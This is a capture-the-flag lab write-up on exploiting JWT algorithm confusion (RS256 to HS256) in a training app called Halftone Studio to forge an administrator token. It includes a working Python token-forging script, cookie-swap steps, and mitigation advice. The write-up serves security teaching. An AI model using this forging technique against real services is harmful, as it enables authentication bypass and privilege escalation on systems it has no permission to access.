---
title: "JWT Algorithm Confusion Leads to Privilege Escalation | Halftone Studio"
date: 2026-06-09 20:00:00 +0530
categories: [A07 - Authentication Failures, JWT]
tags: [jwt, jwt-confusion, hs256, rs256, privilege-escalation, webverselabs-pro, halftone-studio]
author: Shivansh Sharma
image:
    path: /assets/images/posts/halftone-studio-jwt-algorithm-confusion.webp
    alt: Halftone Studio JWT Algorithm Confusion
--------------------------------------------

## Lab Link

Lab: [Halftone Studio](https://dashboard.webverselabs-pro.com/challenges/mirrored)

## Overview

Halftone Studio recently migrated from API keys to JWT-based authentication. During the migration, support was temporarily expanded to accommodate multiple token formats.

The application exposes its public verification key and JWT metadata, creating the conditions for a JWT Algorithm Confusion vulnerability. By abusing the verifier's trust in the token's `alg` header, it becomes possible to forge arbitrary tokens and escalate privileges to administrator.

## Objective

Exploit the JWT verification implementation to forge an administrator token and gain access to privileged functionality.

## Vulnerability Identification

### Classification Hierarchy

```text id="mfzbvv"
A07 - Authentication Failures
└── JWT Verification Flaw
    └── Algorithm Confusion
        └── Privilege Escalation
```

The application trusted the algorithm supplied within the JWT header, allowing attackers to switch from asymmetric verification (RS256) to symmetric verification (HS256).

## Reconnaissance

After creating an account and logging in, the application issued the following cookie:

```http id="vfk4hz"
Cookie: ht_token=<jwt>
```

Decoding the token revealed:

```json id="mkl7fa"
{
  "typ":"JWT",
  "alg":"RS256",
  "kid":"main"
}
```

Payload:

```json id="u3k7ux"
{
  "sub":"kelvin@kel.com",
  "name":"kelvin",
  "role":"customer",
  "brand":"kel"
}
```

The current role was:

```json id="k30nt4"
"role":"customer"
```

During documentation review, two interesting endpoints were discovered:

```text id="5u1xvn"
/.well-known/jwks.json
/public.pem
```

The migration notes also stated:

> During the api-key → JWT migration last quarter, the verifier was widened to accept both the new format (RS256) and a short-lived parallel format.

This strongly suggested a JWT algorithm confusion vulnerability.

## Discovering the Public Key

The first endpoint exposed the JWT metadata.

```http id="9mw3u2"
GET /.well-known/jwks.json
```

Response:

```json id="tt4pvq"
{
  "keys": [
    {
      "alg":"RS256",
      "kid":"main"
    }
  ]
}
```

The second endpoint exposed the RSA public key.

```http id="drzvpf"
GET /public.pem
```

Response:

```text id="4x0syi"
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhki...
-----END PUBLIC KEY-----
```

At this point, the public verification key required for an RS256 ↔ HS256 confusion attack was available.

## Understanding the Vulnerability

Under normal circumstances:

```text id="lj5f57"
RS256
```

Uses:

```text id="svxlka"
Private Key -> Sign
Public Key  -> Verify
```

However, vulnerable JWT implementations trust the algorithm specified in the JWT header rather than enforcing the expected algorithm.

If an attacker changes:

```json id="y0bpcq"
{
  "alg":"RS256"
}
```

to:

```json id="u0r6p4"
{
  "alg":"HS256"
}
```

the server may incorrectly interpret the RSA public key as an HMAC secret.

Since the public key is publicly accessible, an attacker can generate valid signatures and forge arbitrary tokens.

## Forging an Administrator Token

Create a new JWT header:

```json id="g26u87"
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"main"
}
```

Modify the payload:

```json id="ttf9gu"
{
  "sub":"kelvin@kel.com",
  "name":"kelvin",
  "role":"admin",
  "brand":"kel"
}
```

A custom script was used to generate a valid HS256 signature using the exposed public key as the HMAC secret.

### forge.py

```python id="0zwq9o"
import base64
import json
import hmac
import hashlib
import time

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

pub = open("public.pem", "rb").read()

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "main"
}

payload = {
    "sub": "kelvin@kel.com",
    "name": "kelvin",
    "role": "admin",
    "brand": "kel",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())

msg = f"{h}.{p}".encode()

sig = hmac.new(
    pub,
    msg,
    hashlib.sha256
).digest()

print(f"{h}.{p}.{b64url(sig)}")
```

Run:

```bash id="5k4iuh"
python3 forge.py
```

Output:

```text id="4p2iwz"
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Im1haW4ifQ...
```

## Proof of Exploitation

Replace the original JWT cookie with the forged administrator token.

```http id="z7v61g"
Cookie: ht_token=<FORGED_TOKEN>
```

Access privileged functionality:

```http id="dnhqen"
GET /dashboard
```

Administrative functionality becomes accessible because the verifier accepts the attacker-generated HS256 token as valid.

The role has successfully been escalated from:

```text id="8uej24"
customer
```

to:

```text id="h8sxki"
admin
```

The challenge is successfully solved.

```text id="4y9cwm"
WEBVERSE{REDACTED}
```

## Root Cause Analysis

The JWT verifier trusted the algorithm supplied by the client-controlled JWT header.

Instead of enforcing RS256 verification, the application accepted HS256 tokens and used the publicly available RSA verification key as an HMAC secret. Because the public key was exposed through the application's documentation, attackers could generate their own valid signatures and forge arbitrary tokens.

## Impact

Successful exploitation allows attackers to:

* Forge arbitrary JWTs
* Impersonate other users
* Escalate privileges
* Bypass authorization controls
* Access administrative functionality
* Fully compromise authentication integrity

Severity: **Critical**

## Mitigation

To prevent JWT algorithm confusion vulnerabilities:

* Explicitly enforce expected algorithms
* Never trust the `alg` value supplied by the client
* Use separate verification logic for symmetric and asymmetric algorithms
* Reject unexpected algorithms
* Rotate exposed keys when migration errors are discovered
* Use well-maintained JWT libraries and secure defaults

Example:

```python id="11a3sx"
jwt.decode(
    token,
    public_key,
    algorithms=["RS256"]
)
```

## Real-World Insight

JWT Algorithm Confusion vulnerabilities became widely known after multiple libraries accepted attacker-controlled algorithm values during token verification. In affected implementations, attackers could switch from asymmetric algorithms such as RS256 to symmetric algorithms such as HS256 and use publicly available keys to forge valid signatures.

Halftone Studio demonstrates how migration periods often introduce authentication weaknesses. Temporary compatibility code, legacy token formats, and relaxed verification rules can create opportunities for attackers to bypass authentication and gain administrative access.
